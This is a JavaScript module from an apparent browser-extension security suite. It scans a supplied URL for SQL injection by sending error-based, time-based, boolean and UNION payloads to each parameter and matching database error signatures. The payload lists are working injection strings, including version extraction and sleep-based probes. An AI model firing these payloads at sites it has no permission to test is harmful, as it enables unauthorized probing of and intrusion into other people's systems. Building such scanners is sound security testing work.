/**
 * TryHarder Security Suite - SQLiDetect Module
 * Author: a0x194 (https://github.com/a0x194)
 *
 * Lightweight SQL injection detection
 */

import { UI } from '../utils/ui.js';

export class SQLiDetect {
  constructor(app) {
    this.app = app;
    this.results = [];

    // SQL Error signatures by database type
    this.errorSignatures = {
      'MySQL': [
        'SQL syntax.*MySQL', 'Warning.*mysql_', 'MySqlException',
        'valid MySQL result', 'check the manual that corresponds to your (MySQL|MariaDB)',
        'MySqlClient', 'com.mysql.jdbc'
      ],
      'PostgreSQL': [
        'PostgreSQL.*ERROR', 'Warning.*pg_', 'valid PostgreSQL result',
        'Npgsql', 'PG::SyntaxError', 'org.postgresql.util.PSQLException'
      ],
      'MSSQL': [
        'Driver.* SQL[-_ ]*Server', 'OLE DB.* SQL Server', 'SQLServer JDBC',
        'Microsoft SQL Native Client', 'ODBC SQL Server Driver',
        'SQLSrv', 'Unclosed quotation mark'
      ],
      'Oracle': [
        'ORA-[0-9]+', 'Oracle error', 'Oracle.*Driver', 'Warning.*oci_',
        'quoted string not properly terminated'
      ],
      'SQLite': [
        'SQLite.*Exception', 'System.Data.SQLite.SQLiteException',
        'Warning.*sqlite_', 'SQLite error', 'sqlite3.OperationalError',
        'SQLITE_ERROR'
      ],
      'Generic': [
        'SQL error', 'SQL syntax', 'unclosed quotation',
        'unterminated string', 'syntax error', 'query failed',
        'unexpected end of SQL', 'invalid query'
      ]
    };

    // SQL injection payloads
    this.payloads = {
      errorBased: [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
        "' AND '1'='2", "1' ORDER BY 1--", "1' ORDER BY 100--",
        "') OR ('1'='1", "';SELECT SLEEP(0)--", "'||(SELECT '')||'",
        "' UNION SELECT NULL--", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"
      ],
      timeBased: [
        "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT SLEEP(5))--", "' OR (SELECT SLEEP(5))--",
        "';SELECT pg_sleep(5)--", "' || pg_sleep(5)--"
      ],
      boolBased: [
        "' AND '1'='1", "' AND '1'='2", "' OR '1'='1", "' OR '1'='2",
        "1 AND 1=1", "1 AND 1=2", "' AND 1=1--", "' AND 1=2--"
      ],
      union: [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT @@version,NULL--"
      ]
    };
  }

  async run(options) {
    console.log('[SQLiDetect] Starting scan with options:', options);

    if (!options.url) {
      UI.showToast('Please enter a URL with parameters');
      return;
    }

    this.results = [];

    try {
      const urlObj = new URL(options.url);
      const params = new URLSearchParams(urlObj.search);
      const paramNames = Array.from(params.keys());

      if (paramNames.length === 0) {
        UI.showToast('No parameters found in URL');
        return;
      }

      const baseUrl = `${urlObj.origin}${urlObj.pathname}`;

      // Get baseline response
      const baseline = await this.fetchUrl(options.url);
      if (!baseline.success) {
        UI.showToast('Failed to reach target');
        return;
      }

      const baselineLength = baseline.body?.length || 0;

      // Test each parameter
      for (const param of paramNames) {
        const originalValue = params.get(param);

        // Error-based testing
        if (options.errorBased) {
          for (const payload of this.payloads.errorBased) {
            const testUrl = this.buildTestUrl(baseUrl, params, param, payload);
            const response = await this.fetchUrl(testUrl);

            if (response.success && response.body) {
              const dbType = this.detectSQLError(response.body);
              if (dbType) {
                this.results.push({
                  type: 'vuln',
                  title: `SQL Injection (Error-Based) - ${param}`,
                  value: testUrl,
                  subtitle: `Database: ${dbType}`,
                  severity: 'critical',
                  details: { param, payload, dbType, type: 'error-based' }
                });
                break; // Found vuln, move to next param
              }
            }
          }
        }

        // Time-based testing
        if (options.timeBased) {
          for (const payload of this.payloads.timeBased.slice(0, 3)) {
            const testUrl = this.buildTestUrl(baseUrl, params, param, payload);
            const startTime = Date.now();
            const response = await this.fetchUrl(testUrl, { timeout: 15000 });
            const elapsed = Date.now() - startTime;

            if (elapsed >= 4500) { // 5 second delay detected (allowing for network latency)
              this.results.push({
                type: 'vuln',
                title: `SQL Injection (Time-Based) - ${param}`,
                value: testUrl,
                subtitle: `Response delayed by ${Math.round(elapsed / 1000)}s`,
                severity: 'critical',
                details: { param, payload, elapsed, type: 'time-based' }
              });
              break;
            }
          }
        }

        // Boolean-based testing
        if (options.boolBased) {
          const truePayload = "' AND '1'='1";
          const falsePayload = "' AND '1'='2";

          const trueUrl = this.buildTestUrl(baseUrl, params, param, originalValue + truePayload);
          const falseUrl = this.buildTestUrl(baseUrl, params, param, originalValue + falsePayload);

          const trueResponse = await this.fetchUrl(trueUrl);
          const falseResponse = await this.fetchUrl(falseUrl);

          if (trueResponse.success && falseResponse.success) {
            const trueLength = trueResponse.body?.length || 0;
            const falseLength = falseResponse.body?.length || 0;
            const lengthDiff = Math.abs(trueLength - falseLength);

            // Significant difference and true condition matches baseline
            if (lengthDiff > 50 && Math.abs(trueLength - baselineLength) < 100) {
              this.results.push({
                type: 'vuln',
                title: `SQL Injection (Boolean-Based) - ${param}`,
                value: trueUrl,
                subtitle: `Length difference: ${lengthDiff} bytes`,
                severity: 'high',
                details: { param, trueLength, falseLength, lengthDiff, type: 'boolean-based' }
              });
            }
          }
        }

        // Union-based testing
        if (options.union) {
          for (const payload of this.payloads.union) {
            const testUrl = this.buildTestUrl(baseUrl, params, param, payload);
            const response = await this.fetchUrl(testUrl);

            if (response.success && response.body) {
              // Check for successful UNION (null values appear or column count error changes)
              const hasUnionIndicator = response.body.toLowerCase().includes('null') ||
                                       !this.detectSQLError(response.body);

              if (hasUnionIndicator && response.body.length !== baselineLength) {
                this.results.push({
                  type: 'warning',
                  title: `Potential UNION SQLi - ${param}`,
                  value: testUrl,
                  subtitle: 'UNION query may be exploitable',
                  severity: 'medium',
                  details: { param, payload, type: 'union-based' }
                });
                break;
              }
            }
          }
        }

        // Small delay between parameters
        await this.sleep(100);
      }

      this.renderResults();
      UI.showToast(`SQLiDetect found ${this.results.length} potential vulnerabilities`);

    } catch (error) {
      console.error('[SQLiDetect] Error:', error);
      throw error;
    }
  }

  buildTestUrl(baseUrl, params, targetParam, payload) {
    const newParams = new URLSearchParams(params);
    newParams.set(targetParam, payload);
    return `${baseUrl}?${newParams.toString()}`;
  }

  detectSQLError(body) {
    for (const [dbType, patterns] of Object.entries(this.errorSignatures)) {
      for (const pattern of patterns) {
        const regex = new RegExp(pattern, 'i');
        if (regex.test(body)) {
          return dbType;
        }
      }
    }
    return null;
  }

  async fetchUrl(url, options = {}) {
    try {
      return await chrome.runtime.sendMessage({
        action: 'proxyFetch',
        url,
        options: { timeout: options.timeout || 10000 }
      });
    } catch (e) {
      return { success: false, error: e.message };
    }
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  renderResults() {
    UI.renderResults('sqliResults', this.results);
    this.app.results.sqlidetect = this.results;
    this.app.updateStats();
  }
}
